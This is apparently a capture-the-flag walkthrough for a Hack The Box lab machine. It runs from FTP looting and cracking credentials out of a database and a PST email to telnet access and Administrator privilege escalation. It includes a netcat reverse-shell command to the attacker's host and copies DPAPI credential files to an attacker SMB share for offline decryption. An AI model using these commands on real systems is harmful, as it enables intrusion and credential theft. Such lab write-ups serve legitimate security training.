# Access

```bash
TARGET=10.10.10.98
```

```bash
$ sudo nmap -p- --min-rate 10000 $TARGET                     
...
Nmap scan report for 10.10.10.98
...
PORT   STATE SERVICE
21/tcp open  ftp
23/tcp open  telnet
80/tcp open  http
```

```bash
$ sudo nmap -p 21,23,80 -sV -sC $TARGET                  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-01 21:38 PDT
Nmap scan report for 10.10.10.98
Host is up (0.089s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
23/tcp open  telnet  Microsoft Windows XP telnetd (no more connections allowed)
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: MegaCorp
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.97 seconds
```

```bash
$ ftp ftp://anonymous:''@$TARGET
Connected to 10.10.10.98.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
230 User logged in.
Remote system type is Windows_NT.
200 Type set to I.

ftp> passive OFF
Passive mode: off; fallback to active mode: off.

ftp> ls -lha
200 EPRT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer

ftp> cd Backups
250 CWD command successful.

ftp> ls -lha
200 EPRT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM              5652480 backup.mdb
226 Transfer complete.

ftp> cd ..
250 CWD command successful.

ftp> cd Engineer
250 CWD command successful.

ftp> ls -lha
200 EPRT command successful.
125 Data connection already open; Transfer starting.
08-24-18  01:16AM                10870 Access Control.zip
226 Transfer complete.
```

```bash
$ wget -m --no-passive ftp://anonymous:anonymous@$TARGET                                      
--2024-06-02 17:53:17--  ftp://anonymous:*password*@10.10.10.98/
           => ‘10.10.10.98/.listing’
Connecting to 10.10.10.98:21... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PORT ... done.    ==> LIST ... done.

10.10.10.98/.listing             [ <=>                                           ]      97  --.-KB/s    in 0s      

==> PORT ... done.    ==> LIST ... done.

10.10.10.98/.listing             [ <=>                                           ]      97  --.-KB/s    in 0s      

2024-06-02 17:53:18 (10.2 MB/s) - ‘10.10.10.98/.listing’ saved [194]

--2024-06-02 17:53:18--  ftp://anonymous:*password*@10.10.10.98/Backups/
           => ‘10.10.10.98/Backups/.listing’
==> CWD (1) /Backups ... done.
==> PORT ... done.    ==> LIST ... done.

10.10.10.98/Backups/.listing     [ <=>                                           ]      51  --.-KB/s    in 0s      

2024-06-02 17:53:18 (3.25 MB/s) - ‘10.10.10.98/Backups/.listing’ saved [51]

--2024-06-02 17:53:18--  ftp://anonymous:*password*@10.10.10.98/Backups/backup.mdb
           => ‘10.10.10.98/Backups/backup.mdb’
==> CWD not required.
==> PORT ... done.    ==> RETR backup.mdb ... done.
Length: 5652480 (5.4M)

10.10.10.98/Backups/backup.m 100%[==============================================>]   5.39M   563KB/s    in 12s     

2024-06-02 17:53:31 (459 KB/s) - ‘10.10.10.98/Backups/backup.mdb’ saved [5652480]

--2024-06-02 17:53:31--  ftp://anonymous:*password*@10.10.10.98/Engineer/
           => ‘10.10.10.98/Engineer/.listing’
==> CWD (1) /Engineer ... done.
==> PORT ... done.    ==> LIST ... done.

10.10.10.98/Engineer/.listin     [ <=>                                           ]      59  --.-KB/s    in 0s      

2024-06-02 17:53:31 (2.87 MB/s) - ‘10.10.10.98/Engineer/.listing’ saved [59]

--2024-06-02 17:53:31--  ftp://anonymous:*password*@10.10.10.98/Engineer/Access%20Control.zip
           => ‘10.10.10.98/Engineer/Access Control.zip’
==> CWD not required.
==> PORT ... done.    ==> RETR Access Control.zip ... done.
Length: 10870 (11K)

10.10.10.98/Engineer/Access  100%[==============================================>]  10.62K  58.3KB/s    in 0.2s    

2024-06-02 17:53:32 (58.3 KB/s) - ‘10.10.10.98/Engineer/Access Control.zip’ saved [10870]

FINISHED --2024-06-02 17:53:32--
Total wall clock time: 14s
Downloaded: 5 files, 5.4M in 12s (453 KB/s)
```

```bash
$ mdb-tables backup.mdb
... action_log AlarmLog areaadmin att_attreport att_waitforprocessdata attcalclog attexception AuditedExc auth_group_permissions auth_message auth_permission auth_user auth_user_groups auth_user_user_permissions ...
```

```bash
$ mdb-sql backup.mdb   
1 => SELECT username, password FROM auth_user;
+-------------+-------------------+
|username     | password          |
+-------------+-------------------+
|admin        | admin             |
|engineer     | access4u@security |
|backup_admin | admin             |
+-------------+-------------------+
3 Rows retrieved
```

```bash
$ file Access\ Control.zip      
Access Control.zip: Zip archive data, at least v2.0 to extract, compression method=AES Encrypted
```

```bash
$ zip2john Access\ Control.zip 
Access Control.zip/Access Control.pst:$zip2$*0*3*0*6f1cd9ae34...bd46a*$/zip2$:Access Control.pst:Access Control.zip:Access Control.zip
```

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash      
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 512/512 AVX512BW 16x])
Cost 1 (HMAC size) is 10650 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:01:19 DONE (2024-06-01 22:52) 0g/s 179588p/s 179588c/s 179588C/s (Cahir!!!)..*7¡Vamos!
Session completed.
```

```bash
$ john zip.hash --show                                     
0 password hashes cracked, 1 left
```

```bash
$ 7z x Access\ Control.zip 

7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20
 64-bit locale=en_US.UTF-8 Threads:8 OPEN_MAX:524288

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip
Physical Size = 10870

    
Enter password (will not be echoed): access4u@security
Everything is Ok

Size:       271360
Compressed: 10870
```

```bash
$ ls -lha Access\ Control.pst 
-rw-r--r-- 1 kali kali 265K Aug 23  2018 'Access Control.pst'
```

```bash
$ lspst Access\ Control.pst 
Email   From: john@megacorp.com Subject: MegaCorp Access Control System "security" account
```

```bash
$ readpst -m -o emails Access\ Control.pst 
Opening PST file and indexes...
Processing Folder "Deleted Items"
        "Access Control" - 2 items done, 0 items skipped.
```

```bash
$ ls -lha emails/Access\ Control 
total 24K
drwxr-xr-x 2 kali kali 4.0K Jun  1 23:10 .
drwxr-xr-x 3 kali kali 4.0K Jun  1 23:10 ..
-rw-r--r-- 1 kali kali 3.0K Jun  1 23:10 2.eml
-rw-r--r-- 1 kali kali 9.5K Jun  1 23:10 2.msg
```

```bash
$ cat emails/Access\ Control/2.eml 
Status: RO
From: john@megacorp.com <john@megacorp.com>
Subject: MegaCorp Access Control System "security" account
To: 'security@accesscontrolsystems.com'
Date: Thu, 23 Aug 2018 23:44:07 +0000
...
Hi there,

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.
Please ensure this is passed on to your engineers.

Regards,
John
```

## Foothold

```bash
$ telnet $TARGET
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

login: security
password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security> whoami
access\security
```

| username | password | target |
|--|--|--|
| security | 4Cc3ssC0ntr0ller | telnet |

```bash
C:\Users\security\Desktop>powershell
Windows PowerShell 
                   Copyright (C) 2009 Microsoft Corporation. All rights reserved.

systeminfo

Host Name:                 ACCESS
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84191
Original Install Date:     8/21/2018, 9:43:10 PM
System Boot Time:          6/2/2024, 5:31:13 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
                           [02]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     6,143 MB
Available Physical Memory: 5,387 MB
Virtual Memory: Max Size:  12,285 MB
Virtual Memory: Available: 11,507 MB
Virtual Memory: In Use:    778 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 110 Hotfix(s) Installed.
                           [01]: KB981391
                           [02]: KB981392
...
                           [109]: KB982132
                           [110]: KB982799
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    Yes
                                 DHCP Server:     255.255.255.255
                                 IP address(es)
                                 [01]: 10.10.10.98
                                 [02]: fe80::a491:e7d6:27ac:1d25
                                 [03]: dead:beef::a491:e7d6:27ac:1d25
```

## Privilege Escalation

```bash
C:\Users\Public\Desktop>type "ZKAccess3.5 Security System.lnk"
...
runas.exe��:1��:1�*Yrunas.exeL-K��E�C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%�
...
```

```bash
C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred
```

```bash
C:\Users\Public\Desktop>cmdkey /list

Currently stored credentials:
    Target: Domain:interactive=ACCESS\Administrator
    Type: Domain Password
    User: ACCESS\Administrator
```

```bash
$ impacket-smbserver share $(pwd) -smb2support
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

```bash
C:\temp>net use \\10.10.14.3\share
The command completed successfully.

C:\temp>net use
New connections will be remembered.
Status       Local     Remote                    Network
-------------------------------------------------------------------------------
OK                     \\10.10.14.3\share        Microsoft Windows Network
The command completed successfully.

C:\temp>copy \\10.10.14.3\share\nc.exe .
        1 file(s) copied.
```

```bash
$ impacket-smbserver share $(pwd) -smb2support
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.98,49157)
[*] AUTHENTICATE_MESSAGE (ACCESS\security,ACCESS)
[*] User ACCESS\security authenticated successfully
[*] security::ACCESS:aaaaaaaaaaaaaaaa:41b718e5761aa3bc9403db771e60e57a:010100000000000080277ccab7b4da013bc87a3870158759000000000100100054006200570055004b004d00660064000300100054006200570055004b004d006600640002001000740058005a005600790042004d00510004001000740058005a005600790042004d0051000700080080277ccab7b4da01060004000200000008003000300000000000000000000000002000000e9cd568efe517d30d214df6e3cd6020dae9bb2a9d8425bad4287df57b95be700a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003300000000000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:share)
```

### Using runas (savecred) - cmdkey

```bash
$ rlwrap -cAr nc -nlvp 4444
listening on [any] 4444 ...
```

```bash
C:\temp> runas /user:ACCESS\Administrator /savecred "C:\Temp\nc.exe -e cmd.exe 10.10.14.3 4444"
```

```bash
$ rlwrap -cAr nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.98] 49159
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
access\administrator
```

### Using dpapi offline - cmdkey

```bash
C:\Users\Public\Desktop>cmdkey /list

Currently stored credentials:
    Target: Domain:interactive=ACCESS\Administrator
    Type: Domain Password
    User: ACCESS\Administrator
```

Getting masterkey

```bash
dir /s /a:h C:\Users\security\AppData\Local\Microsoft\Protect\
dir /s /a:h C:\Users\security\AppData\Roaming\Microsoft\Protect\
```

```bash
C:\temp>dir /s /a:h C:\Users\security\AppData\Local\Microsoft\Protect\
The system cannot find the file specified.


C:\temp>dir /s /a:h C:\Users\security\AppData\Roaming\Microsoft\Protect\
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F
 Directory of C:\Users\security\AppData\Roaming\Microsoft\Protect
08/22/2018  10:18 PM                24 CREDHIST
               1 File(s)             24 bytes
 Directory of C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001
08/22/2018  10:18 PM               468 0792c32e-48a5-4fe3-8b43-d93d64590580
08/22/2018  10:18 PM                24 Preferred
               2 File(s)            492 bytes
     Total Files Listed:
               3 File(s)            516 bytes
               0 Dir(s)   3,347,292,160 bytes free
```

```bash
C:\temp>xcopy /E /H C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001\* \\10.10.14.3\share
C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001\0792c32e-48a5-4fe3-8b43-d93d64590580
C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001\Preferred
2 File(s) copied
```

```bash
$ impacket-dpapi masterkey -file 0792c32e-48a5-4fe3-8b43-d93d64590580 -password 4Cc3ssC0ntr0ller -sid S-1-5-21-953262931-566350628-63446256-1001
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 0792c32e-48a5-4fe3-8b43-d93d64590580
Flags       :        5 (5)
Policy      :        0 (0)
MasterKeyLen: 000000b0 (176)
BackupKeyLen: 00000090 (144)
CredHistLen : 00000014 (20)
DomainKeyLen: 00000000 (0)

Decrypted key with User Key (SHA1)
Decrypted key: 0xb360fa5dfea278892070f4d086d47ccf5ae30f7206af0927c33b13957d44f0149a128391c4344a9b7b9c9e2e5351bfaf94a1a715627f27ec9fafb17f9b4af7d2
```

Masterkey

```bash
0xb360fa5dfea278892070f4d086d47ccf5ae30f7206af0927c33b13957d44f0149a128391c4344a9b7b9c9e2e5351bfaf94a1a715627f27ec9fafb17f9b4af7d2
```

Getting saved credential

```bash
dir /s /a:h C:\Users\security\AppData\Local\Microsoft\Protect\
dir /s /a:h C:\Users\security\AppData\Roaming\Microsoft\Protect\
```

```bash
C:\temp>dir /s /a:h C:\Users\security\AppData\Local\Microsoft\Credentials\
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F
File Not Found

C:\temp>dir /s /a:h C:\Users\security\AppData\Roaming\Microsoft\Credentials\
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\Users\security\AppData\Roaming\Microsoft\Credentials

08/22/2018  10:18 PM               538 51AB168BE4BDB3A603DADE4F8CA81290
               1 File(s)            538 bytes

     Total Files Listed:
               1 File(s)            538 bytes
               0 Dir(s)   3,347,292,160 bytes free
```

```bash
C:\temp>xcopy /E /H C:\Users\security\AppData\Roaming\Microsoft\Credentials\* \\10.10.14.3\share
C:\Users\security\AppData\Roaming\Microsoft\Credentials\51AB168BE4BDB3A603DADE4F8CA81290
1 File(s) copied
```

```bash
$ impacket-dpapi credential -file 51AB168BE4BDB3A603DADE4F8CA81290 -key 0xb360fa5dfea278892070f4d086d47ccf5ae30f7206af0927c33b13957d44f0149a128391c4344a9b7b9c9e2e5351bfaf94a1a715627f27ec9fafb17f9b4af7d2
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[CREDENTIAL]
LastWritten : 2018-08-22 21:18:49
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:interactive=ACCESS\Administrator
Description : 
Unknown     : 
Username    : ACCESS\Administrator
Unknown     : 55Acc3ssS3cur1ty@megacorp
```

| username | password | target |
|--|--|--|
| security | 4Cc3ssC0ntr0ller | telnet |
| Administrator | 55Acc3ssS3cur1ty@megacorp | telnet |

```bash
$ telnet $TARGET       
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

login: Administrator
password: 55Acc3ssS3cur1ty@megacorp

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\Administrator> whoami
access\administrator
```
